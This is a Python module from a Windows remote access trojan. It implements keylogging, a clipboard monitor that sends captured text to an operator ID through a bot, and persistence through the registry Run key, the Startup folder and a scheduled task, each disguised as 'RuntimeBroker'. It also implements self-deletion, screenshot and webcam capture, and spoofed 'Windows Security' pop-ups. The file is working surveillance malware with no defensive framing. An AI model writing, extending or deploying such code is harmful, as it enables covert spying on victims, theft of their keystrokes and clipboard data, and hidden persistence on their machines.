import os
import sys
import random
import tempfile
import subprocess
import threading
import ctypes
import winreg
import logging
from pathlib import Path
from typing import Optional

import mss
import mss.tools
import cv2
from pynput import keyboard

from .config import CREATE_NO_WINDOW
from .state import state

log = logging.getLogger("rat")

def on_press(key) -> None:
    try:
        state.keylog_buffer.append(key.char)
    except AttributeError:
        state.keylog_buffer.append(f"[{str(key).replace('Key.', '')}]")

def start_keylogger() -> None:
    if state.keylog_active:
        return
    state.keylog_active = True
    state.listener = keyboard.Listener(on_press=on_press)
    state.listener.start()

def stop_keylogger() -> str:
    if state.listener:
        try:
            state.listener.stop()
        except Exception:
            pass
    state.keylog_active = False
    data = "".join(state.keylog_buffer)
    state.keylog_buffer.clear()
    return data

def clipboard_worker() -> None:
    from .config import ADMIN_ID
    while state.clip_active:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data and data != state.last_clip and len(str(data)) > 5:
                state.last_clip = data
                if hasattr(clipboard_worker, "bot"):
                    clipboard_worker.bot.send_message(ADMIN_ID, f"<b>Clipboard:</b>\n<code>{str(data)[:3000]}</code>")
        except Exception:
            pass
        import time
        time.sleep(4)

def start_clip() -> None:
    if not state.clip_active:
        state.clip_active = True
        threading.Thread(target=clipboard_worker, daemon=True).start()

def stop_clip() -> None:
    state.clip_active = False

def persist() -> str:
    exe = os.path.abspath(sys.argv[0])
    res = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RuntimeBroker", 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
        res.append("Run OK")
    except Exception as e:
        res.append(f"Run fail: {e}")
    try:
        import shutil
        startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        shutil.copy2(exe, startup / "RuntimeBroker.exe")
        res.append("Startup OK")
    except Exception as e:
        res.append(f"Startup fail: {e}")
    try:
        task_name = "RuntimeBroker"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe}" /sc onlogon /rl highest /f'
        subprocess.check_output(cmd, shell=True, creationflags=CREATE_NO_WINDOW, stderr=subprocess.STDOUT)
        res.append("TaskScheduler OK")
    except Exception as e:
        res.append(f"TaskScheduler fail: {e}")
    return " | ".join(res)

def self_destruct() -> None:
    try:
        bat = os.path.join(tempfile.gettempdir(), f"c{random.randint(10000,99999)}.bat")
        with open(bat, "w") as f:
            f.write(f'@echo off\ntimeout /t 3 /nobreak >nul\ndel /f /q "{os.path.abspath(sys.argv[0])}"\ndel /f /q "%~f0"\n')
        subprocess.Popen(bat, shell=True, creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        log.debug("self_destruct: %s", e)
    sys.exit(0)

def take_screenshot() -> str:
    path = os.path.join(tempfile.gettempdir(), f"s{random.randint(10000,99999)}.png")
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])
        mss.tools.to_png(img.rgb, img.size, output=path)
    return path

def take_webcam() -> Optional[str]:
    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cam.isOpened():
        return None
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    path = os.path.join(tempfile.gettempdir(), f"c{random.randint(10000,99999)}.jpg")
    cv2.imwrite(path, frame)
    return path

def show_msg(text: str) -> None:
    ctypes.windll.user32.MessageBoxW(0, text, "Windows Security", 0x40)
